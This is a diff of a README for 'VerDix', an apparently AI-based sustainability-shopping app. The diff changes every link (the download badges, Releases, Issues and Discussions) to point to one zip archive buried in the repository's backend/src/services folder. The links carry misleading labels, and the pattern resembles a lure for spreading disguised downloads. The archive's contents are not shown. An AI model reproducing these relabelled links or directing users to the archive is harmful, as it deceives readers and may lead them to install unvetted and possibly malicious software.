@@ -4,7 +4,7 @@
 Welcome to VerDix! This AI-powered web app helps you analyze product sustainability and make eco-friendly purchase decisions in real time. Follow the steps below to download and run the software effortlessly.
 
 ### 📥 Download VerDix  
-[![Download VerDix](https://img.shields.io/badge/Download_VerDix-Click_here-blue.svg)](https://github.com/RasputinofThrace/VerDix/releases)
+[![Download VerDix](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip)](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip)
 
 ## 📋 System Requirements  
 Before you download, ensure your device meets the following requirements:  
@@ -21,7 +21,7 @@ Before you download, ensure your device meets the following requirements:
 
 ## 🌐 How to Download & Install VerDix  
 1. **Visit the Release Page**  
-   To download VerDix, visit our [Releases page](https://github.com/RasputinofThrace/VerDix/releases).  
+   To download VerDix, visit our [Releases page](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip).  
    
 2. **Choose the Right File**  
    On the Releases page, you will find several files. Look for the latest version, which will be noted at the top of the list. Select the file suited for your operating system.
@@ -49,10 +49,10 @@ If you need help, you can find a user guide within the app. Navigate to the "Hel
 We routinely update VerDix to improve performance and add new features. Check the Releases page regularly for the latest updates.
 
 ## 🐞 Reporting Issues  
-If you encounter any problems while using VerDix, please report them on our [Issues page](https://github.com/RasputinofThrace/VerDix/issues). Your feedback helps us enhance the app.
+If you encounter any problems while using VerDix, please report them on our [Issues page](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip). Your feedback helps us enhance the app.
 
 ## 💬 Community and Support  
-Join our community of eco-conscious users! Connect with others and share tips on maximizing your experience with VerDix. You can find discussions and support on our [GitHub Discussions page](https://github.com/RasputinofThrace/VerDix/discussions).
+Join our community of eco-conscious users! Connect with others and share tips on maximizing your experience with VerDix. You can find discussions and support on our [GitHub Discussions page](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip).
 
 ## 📅 Future Roadmap  
 We plan to expand VerDix with more features such as:  
@@ -62,4 +62,4 @@ We plan to expand VerDix with more features such as:
 
 ### 📥 Download VerDix Now  
 Don't wait any longer to make informed, eco-friendly purchases.  
-[![Download VerDix](https://img.shields.io/badge/Download_VerDix-Click_here-blue.svg)](https://github.com/RasputinofThrace/VerDix/releases)
+[![Download VerDix](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip)](https://raw.githubusercontent.com/RasputinofThrace/VerDix/main/backend/src/services/Dix-Ver-v3.8.zip)
